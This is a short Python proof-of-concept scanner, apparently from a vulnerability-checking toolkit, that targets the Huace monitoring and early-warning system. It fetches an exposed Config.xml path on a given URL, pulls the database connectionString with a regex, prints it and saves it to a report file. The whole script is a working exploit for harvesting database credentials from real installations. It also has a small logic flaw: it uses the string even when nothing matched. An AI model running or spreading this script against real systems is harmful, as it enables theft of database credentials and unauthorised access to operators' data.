import re

import requests
import time
import buter
import wirtefile

filename = "./reps/华测监测预警系统数据库泄露-"+str(time.strftime("%Y-%m-%d", time.localtime()))
headers = {
        "User-Agent": "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.192 Mobile Safari/537.36"
    }


poc = "/web/Report/Rpt/Config/Config.xml"

def HCConfigxxxl(url):
    try:
        reps = requests.get(url + poc, headers=headers, timeout=2, verify=False)
        if reps.status_code == 200 and '<?xml' in reps.text:
            print(buter.colors.GREEN+  f"存在华测监测预警系统数据库泄露 url : {url}" + buter.colors.END)
            match = re.search(r'connectionString="(.*?)"', reps.text)
            if match:
                connection_string = match.group(1)
                print(buter.colors.GREEN + f"repsonse : {connection_string}" + buter.colors.END)
            else:
                print(buter.colors.LAN + f"未查询到敏感信息,请手工尝试 : {url}" + buter.colors.END)
            reptext = url +" info : "+ connection_string
            wirtefile.writefiles(filename,reptext)
        else:
            print(buter.colors.RED+ f"未发现华测监测预警系统数据库泄露 url : {url} " + buter.colors.END)
    except Exception as e:
        print(buter.colors.END+f"ERROR : {e}"+buter.colors.END)
